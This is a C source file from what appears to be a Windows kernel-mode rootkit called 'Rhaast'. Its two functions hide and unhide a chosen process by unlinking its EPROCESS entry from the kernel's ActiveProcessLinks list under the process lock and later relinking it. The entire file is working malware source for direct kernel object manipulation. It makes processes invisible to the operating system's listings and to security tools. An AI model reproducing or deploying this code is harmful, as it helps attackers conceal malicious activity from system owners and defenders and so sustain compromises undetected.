#include <Rhaast.h>

/**
 * @brief
 *      Hides specified process id
 *
 * @param Pid
 *      Pid of process to hide
 *
 * @return 
 *      function status 
 */
NTSTATUS ProcessHide(
    IN ULONG Pid
) {
    PEPROCESS   EProcess       = NULL;
    NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY ProcessActList = NULL;
    PVOID       ProcessLock    = NULL;

    /* if found just tell it was successful and return */
    if ( PsListHiddenCheck( Pid ) ) {
        NtStatus = STATUS_SUCCESS;
        goto CLEANUP;
    }
    
    /* get Process EPROCESS object by Pid */
    if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Pid ), &EProcess) ) ) {
        PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
        goto CLEANUP;
    }

    /* get pointer of EPROCESS.ActiveProcessLinks linked list */
    if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessActiveList ) ) ) { 
        NtStatus = STATUS_UNSUCCESSFUL;
        goto CLEANUP;
	}

    /* get pointer of EPROCESS.ProcessLock lock */
    if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessLock ) ) ) {
        NtStatus = STATUS_UNSUCCESSFUL;
        goto CLEANUP; 
    }

    /* acquire ActiveProcessLinks lock */
    ExAcquirePushLockExclusive( ProcessLock );

    /* backup & add EPROCESS.ActiveProcessLinks entry to 
     * our internal linked list to un-hide it later */
    if ( ! NT_SUCCESS( NtStatus = PsListHiddenAdd( Pid, ProcessActList ) ) ) {
        PUTS( "Failed to add process to PsHidden list" )
        goto CLEANUP;
    }

    /* remove process from double linked list */
    DoubleLinkedRemove( ProcessActList );

CLEANUP:
    if ( ProcessLock ) {
        /* release lock */
        ExReleasePushLockExclusive( ProcessLock ); 
    }

    if ( EProcess ) {
        ObfDereferenceObject( EProcess );
    }

    return NtStatus;
}

/**
 * @brief
 *      unhide process by re-inserting the hidden process
 *      EPROCESS into the EPROCESS.ActiveProcessLinks
 *      of the System Process (0x4)
 *
 * @param Pid
 *      process to unhide
 *
 * @return
 *      status of function
 */
NTSTATUS ProcessUnHide(
    IN ULONG Pid
) {
    PEPROCESS   EProcess       = NULL;
    NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY ProcessActList = NULL;
    PLIST_ENTRY ProcessEntry   = NULL;
    PVOID       ProcessLock    = NULL;

    /* if not found just tell it was unsuccessful and return */
    if ( ! PsListHiddenCheck( Pid ) ) {
        goto CLEANUP;
    }
        
    /* get Process EPROCESS object by Pid */
    if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( SYSTEM_PROCESS_PID ), &EProcess ) ) ) {
        PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
        goto CLEANUP;
    }

    /* get pointer of EPROCESS.ActiveProcessLinks linked list */
    if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessActiveList ) ) ) {
        NtStatus = STATUS_UNSUCCESSFUL;
        goto CLEANUP;
    }

    /* get pointer of EPROCESS.ProcessLock lock */
    if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessLock ) ) ) {
        NtStatus = STATUS_UNSUCCESSFUL;
        goto CLEANUP;
    }

    /* acquire ActiveProcessLinks lock */
    ExAcquirePushLockExclusive( ProcessLock );

    /* backup & add EPROCESS.ActiveProcessLinks entry to
     * our internal linked list to un-hide it later */
    if ( ! NT_SUCCESS( NtStatus = PsListHiddenRemove( Pid, &ProcessEntry ) ) ) {
        PUTS( "Failed to remove process from PsHidden list" )
        goto CLEANUP;
    }

    /* insert our hidden process back into the ActiveProcessLinks
     * from the System Process */
    DoubleLinkedAdd( ProcessActList, ProcessEntry  );

CLEANUP:
    if ( ProcessLock ) {
        /* release lock */
        ExReleasePushLockExclusive( ProcessLock );
    }

    if ( EProcess ) {
        ObfDereferenceObject( EProcess );
    }

    return NtStatus;
}